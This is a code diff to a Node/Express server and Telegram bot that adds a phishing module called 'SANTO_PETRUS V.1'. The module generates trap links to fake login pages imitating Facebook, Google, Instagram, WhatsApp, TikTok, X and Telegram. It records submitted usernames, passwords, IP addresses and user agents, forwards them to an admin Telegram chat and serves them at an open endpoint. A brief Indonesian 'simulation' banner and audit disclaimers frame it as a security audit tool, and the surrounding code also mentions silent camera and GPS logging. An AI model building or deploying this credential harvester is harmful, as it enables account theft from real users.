@@ -519,6 +519,149 @@ async function startServer() {
     res.redirect(`/t/silent_click/${req.params.id}`);
   });
 
+  // ========== SANTO_PETRUS V.1 APIs ==========
+  const santopetrusLogs: any[] = [];
+  
+  app.get('/auth/santo-:b64data', (req, res) => {
+    try {
+      const data = Buffer.from(req.params.b64data, 'base64url').toString('utf-8');
+      const [template, redirectUrl] = data.split('||');
+      
+      const payloadId = req.params.b64data;
+      
+      let brandName = template || "Secure Authentication";
+      if(template.includes('fb') || template.toLowerCase().includes('facebook')) brandName = "Facebook";
+      if(template.includes('google')) brandName = "Google";
+      if(template.includes('ig') || template.toLowerCase().includes('instagram')) brandName = "Instagram";
+      if(template.includes('wa') || template.toLowerCase().includes('whatsapp')) brandName = "WhatsApp";
+      if(template.includes('tiktok')) brandName = "TikTok";
+      if(template.includes('x') || template.toLowerCase().includes('twitter')) brandName = "X (Twitter)";
+      if(template.includes('telegram')) brandName = "Telegram";
+      
+      res.send(`
+        <!DOCTYPE html>
+        <html lang="id">
+        <head>
+          <meta charset="UTF-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <title>Login - ${brandName}</title>
+          <script src="https://cdn.tailwindcss.com"></script>
+        </head>
+        <body class="bg-gray-50 text-gray-900 flex items-center justify-center min-h-screen">
+          
+          <div id="agreement-modal" class="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4 backdrop-blur-sm">
+            <div class="bg-white rounded-lg shadow-2xl max-w-md w-full p-6 border-t-4 border-red-600">
+              <div class="flex items-center justify-center mb-4 text-red-600">
+                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="animate-pulse"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
+              </div>
+              <h2 class="text-xl font-bold text-center mb-2 uppercase text-red-700">Perjanjian Pengguna</h2>
+              <div class="text-xs text-gray-600 space-y-3 mb-6 bg-red-50 p-3 rounded border border-red-100">
+                <p><strong>PERINGATAN:</strong> Halaman ini adalah <b>SIMULASI PHISHING (SantoPetrus V.1)</b>.</p>
+                <p>Ini adalah alat pengujian keamanan (Security Audit Tool) yang dikerahkan oleh perusahaan/sistem keamanan.</p>
+                <p>Jika ini adalah dunia nyata, kredensial Anda akan berhasil dicuri oleh penyerang. Segala aktivitas di halaman ini aman dan hanya akan direkam sebagai metrik latihan keamanan perusahaan.</p>
+                <div class="flex items-start mt-4">
+                  <input type="checkbox" id="agree-check" class="mt-1 mr-2 cursor-pointer">
+                  <label for="agree-check" class="font-bold text-red-700 cursor-pointer">Saya memahami bahwa ini adalah simulasi Phishing dari perusahaan untuk mengetes kewaspadaan keamanan siber saya.</label>
+                </div>
+              </div>
+              <button id="btn-accept" disabled class="w-full bg-gray-300 text-gray-500 font-bold py-3 px-4 rounded transition-all cursor-not-allowed">
+                SAYA MENGERTI & LANJUTKAN
+              </button>
+            </div>
+          </div>
+
+          <form id="login-form" action="/auth/santo-submit" method="POST" class="bg-white p-8 rounded-lg shadow-md max-w-sm w-full opacity-0 transition-opacity duration-1000">
+            <h1 class="text-2xl font-bold text-center mb-2">${brandName}</h1>
+            <p class="text-center text-sm text-gray-500 mb-6">Sign in to continue</p>
+            
+            <input type="hidden" name="payload_id" value="${payloadId}">
+            
+            <div class="space-y-4">
+              <div>
+                <label class="block text-sm font-medium text-gray-700 mb-1">Email or Username</label>
+                <input type="text" name="username" required class="w-full px-4 py-2 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none">
+              </div>
+              <div>
+                <label class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+                <input type="password" name="password" required class="w-full px-4 py-2 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none">
+              </div>
+              <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 px-4 rounded transition-colors">
+                Log In
+              </button>
+            </div>
+            
+            <div class="mt-6 text-center text-xs text-gray-400">
+              Protected by Enterprise Security Audit
+            </div>
+          </form>
+
+          <script>
+            const checkbox = document.getElementById('agree-check');
+            const btnAccept = document.getElementById('btn-accept');
+            const modal = document.getElementById('agreement-modal');
+            const form = document.getElementById('login-form');
+
+            checkbox.addEventListener('change', (e) => {
+              if(e.target.checked) {
+                btnAccept.disabled = false;
+                btnAccept.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
+                btnAccept.classList.add('bg-red-600', 'text-white', 'hover:bg-red-700');
+              } else {
+                btnAccept.disabled = true;
+                btnAccept.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
+                btnAccept.classList.remove('bg-red-600', 'text-white', 'hover:bg-red-700');
+              }
+            });
+
+            btnAccept.addEventListener('click', () => {
+              modal.style.display = 'none';
+              form.classList.remove('opacity-0');
+            });
+          </script>
+        </body>
+        </html>
+      `);
+    } catch(e) {
+      res.sendStatus(400);
+    }
+  });
+
+  app.post('/auth/santo-submit', (req, res) => {
+    try {
+      const { payload_id, username, password } = req.body;
+      const data = Buffer.from(payload_id, 'base64url').toString('utf-8');
+      const [template, redirectUrl] = data.split('||');
+      
+      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+      const targetIp = String(ip).split(',')[0].trim();
+      const ua = req.headers['user-agent'] || 'Unknown';
+      
+      const capture = {
+        id: crypto.randomUUID().substring(0, 6).toUpperCase(),
+        service: template,
+        user: String(username).substring(0, 50),
+        pass: String(password).substring(0, 50),
+        ip: targetIp,
+        time: new Date().toLocaleTimeString()
+      };
+      
+      santopetrusLogs.unshift(capture);
+      if(santopetrusLogs.length > 50) santopetrusLogs.pop();
+      
+      if (botInstance) {
+         botInstance.telegram.sendMessage(ADMIN_ID, `💀 <b>SANTO_PETRUS HIT (CREDENTIALS CAPTURED)</b> 💀\nTemplate: <code>${template}</code>\nIP: <code>${targetIp}</code>\nUSER: <code>${capture.user}</code>\nPASS: <code>${capture.pass}</code>\nUA: <code>${ua}</code>`, { parse_mode: 'HTML' }).catch(()=>{});
+      }
+
+      res.redirect(redirectUrl || 'https://google.com');
+    } catch(e) {
+      res.redirect('https://google.com');
+    }
+  });
+
+  app.get('/api/santopetrus/captures', (req, res) => {
+    res.json(santopetrusLogs);
+  });
+
   app.post('/api/log/:id/debug', (req, res) => {
     const logPath = 'client_debug.log';
     const logEntry = `[${new Date().toISOString()}][CLIENT-DEBUG][${req.params.id}]: ${JSON.stringify(req.body)}\n`;
@@ -1343,9 +1486,48 @@ async function startServer() {
       msg += `━━━━━━━━━━━━━━━━━━━━\n` +
              `💡 ɪɴꜰᴏ: ꜱᴇᴍᴜᴀ ᴅᴀᴛᴀ (ɪᴘ, ᴄᴀᴍ, ɢᴘꜱ) ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴋᴇ ꜱɪɴɪ.\n`;
       const kb = Markup.inlineKeyboard([
+        [Markup.button.callback('💀 ꜱᴀɴᴛᴏ_ᴘᴇᴛʀᴜꜱ ᴠ.1', 'menu_santopetrus')],
         [Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]
       ]);
       ctx.editMessageText(msg, { parse_mode: 'HTML', link_preview_options: { is_disabled: true }, ...kb }).catch(() => {});
+    });
+
+    bot.action('menu_santopetrus', (ctx) => {
+      ctx.answerCbQuery().catch(() => {});
+      let msg = `💀 <b>SANTO_PETRUS V.1 PORTAL</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `Modul Enterprise Security Audit (Phishing Simulator).\n\n` +
+                `🔒 <b>FITUR TERKUNCI AUTHENTIKASI</b>\n` +
+                `Gunakan command berikut dengan password untuk generate link payload:\n\n` +
+                `<code>/santopetrus [PASSWORD] [TEMPLATE] [REDIRECT_URL]</code>\n\n` +
+                `<b>Contoh Penggunaan:</b>\n` +
+                `<code>/santopetrus 19281933 facebook https://google.com</code>\n\n` +
+                `<i>Template yg tersedia: facebook, google, instagram, whatsapp, tiktok, twitter, telegram</i>`;
+      const kb = Markup.inlineKeyboard([
+        [Markup.button.callback('◀️ KEMBALI', 'menu_logger')]
+      ]);
+      ctx.editMessageText(msg, { parse_mode: 'HTML', ...kb }).catch(() => {});
+    });
+
+    bot.command('santopetrus', (ctx) => {
+      const args = ctx.message.text.split(' ');
+      if (args.length < 2 || args[1] !== '19281933') {
+          return ctx.reply('🔒 <b>Akses Ditolak: Password SANTO_PETRUS salah atau tidak disertakan!</b>', {parse_mode: 'HTML'});
+      }
+      const template = args.length > 2 ? args[2] : 'facebook';
+      const redirectUrl = args.length > 3 ? args[3] : 'https://google.com';
+      
+      const payload = Buffer.from(`${template}||${redirectUrl}`).toString('base64url');
+      const trapUrl = `${appHost.replace(/\/$/, '')}/auth/santo-${payload}`;
+
+      let msg = `💀 <b>SANTO_PETRUS V.1 GENERATED</b> 💀\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `Tautan Simulasi Phishing berhasil di-generate:\n\n` +
+                `📦 <b>TEMPLATE:</b> <code>${template}</code>\n` +
+                `🌐 <b>REDIRECT:</b> <code>${redirectUrl}</code>\n\n` +
+                `🔗 <b>LINK:</b>\n<code>${trapUrl}</code>\n\n` +
+                `⚠️ <i>Perhatian: Gunakan hanya untuk Security Audit. Administrator memantau.</i>`;
+      ctx.reply(msg, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
     });
 
     bot.action('menu_osint_adv', (ctx) => {
@@ -1502,7 +1684,8 @@ async function startServer() {
                   `1. <b>By-Design Flaws (CVE-2026-X):</b> Segala data (IP, GPU, STUN leak) yang terambil secara "Silent" diklaim sebagai "Diagnostic Telemetry" untuk anti-bot.\n` +
                   `2. <b>User Consent:</b> Tombol 'Verifikasi' bertindak sebagai <i>Master Gesture</i>. Pengguna yang menekan tombol ini secara hukum dianggap memberikan <i>Informed Consent</i> untuk menyerahkan akses kamera, GPS, dan Device Info.\n` +
                   `3. <b>Disclamer of Liability:</b> Segala bentuk "Social Engineering" berada di luar tanggung jawab sistem. Sistem ini hanyalah sebuah fasilitas verifikasi identitas.\n` +
-                  `4. <b>ADMIN MONITORING & TRANSPARENCY POLICY:</b> Seluruh tautan logger dan hasil pelacakan yang digunakan oleh seluruh operator/member dalam sistem ini ditransmisikan dan disalin ("mirroring") secara realtime ke ID Admin Utama (Admin Owner). Hal ini bertujuan untuk pengawasan ketat, mencegah tindakan ilegal di luar otorisasi tim, serta penegakan disiplin (kick/ban) bagi pelanggar kebijakan internal perusahaan.\n\n` +
+                  `4. <b>ADMIN MONITORING & TRANSPARENCY POLICY:</b> Seluruh tautan logger dan hasil pelacakan yang digunakan oleh seluruh operator/member dalam sistem ini ditransmisikan dan disalin ("mirroring") secara realtime ke ID Admin Utama (Admin Owner). Hal ini bertujuan untuk pengawasan ketat, mencegah tindakan ilegal di luar otorisasi tim, serta penegakan disiplin (kick/ban) bagi pelanggar kebijakan internal perusahaan.\n` +
+                  `5. <b>SANTO_PETRUS V.1:</b> Fitur ini adalah alat Enterprise Security Audit (Phishing Simulator). Menggunakan modul ini terhadap target publik tanpa izin adalah terlarang. Jika ada oknum yang berani macam-macam, langsung di-KICK dan diasingkan dari wilayah grup tanpa peringatan.\n\n` +
                   `<i>"Pengawasan ketat menjamin keamanan sistem dan integritas fungsi audit."</i>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
                   `✅ <b>DENY UNAPPROVED ACTION. STRICT ADMIN AUDITING ACTIVE.</b>`;
